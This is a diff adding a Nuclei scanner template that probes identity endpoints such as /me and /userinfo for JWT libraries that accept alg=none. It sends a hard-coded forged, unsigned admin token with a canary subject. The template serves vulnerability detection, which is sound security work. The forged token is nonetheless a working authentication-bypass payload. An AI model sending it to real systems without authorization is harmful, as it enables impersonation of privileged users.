@@ -1,0 +1,57 @@
+# gap: jwt-none-algorithm-accepted
+id: jwt-none-algorithm-accepted
+
+info:
+  name: JWT alg=none Accepted by Identity Endpoint (Forged Token Echoed)
+  author: TyrusRC
+  severity: critical
+  description: |
+    Sends a forged JWT with header {"alg":"none","typ":"JWT"} and an empty
+    signature (trailing dot) to common claim-echoing identity endpoints
+    (/me, /userinfo, /api/user, /api/profile, /api/whoami). The payload
+    contains a fixed canary subject and admin role/user claims. If the
+    server validates the token without enforcing an algorithm and echoes
+    the canary subject in the response body, authentication has been
+    bypassed and the request is running with attacker-supplied identity.
+    This is family detection for the long-running JWT-libs-accept-none
+    bug class (jsonwebtoken, jose, pyjwt, golang-jwt and many in-house
+    parsers across the years); replays on future variants rather than a
+    single CVE.
+  reference:
+    - https://cwe.mitre.org/data/definitions/347.html
+    - https://datatracker.ietf.org/doc/html/rfc7519
+    - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens
+  tags: custom,vulnerabilities,jwt,auth,authn-bypass,owasp
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/me"
+      - "{{BaseURL}}/api/user"
+      - "{{BaseURL}}/api/v1/me"
+      - "{{BaseURL}}/api/v1/user"
+      - "{{BaseURL}}/userinfo"
+      - "{{BaseURL}}/api/userinfo"
+      - "{{BaseURL}}/api/profile"
+      - "{{BaseURL}}/api/whoami"
+      - "{{BaseURL}}/me"
+    headers:
+      Authorization: "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJudWNsZWktand0LWNhbmFyeSIsInVzZXIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTcwMDAwMDAwMCwiZXhwIjo5OTk5OTk5OTk5fQ."
+      Accept: "application/json"
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - 'contains(body, "nuclei-jwt-canary")'
+          - '!contains(body, "eyJzdWIiOiJudWNsZWktand0")'
+          - 'contains(body, "\"sub\"") || contains(body, "\"user\"") || contains(body, "\"role\"") || contains(body, "\"username\"")'
+        condition: and
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - '"(sub|user|username|role|roles|email)"\s*:\s*"[^"]{1,64}"'
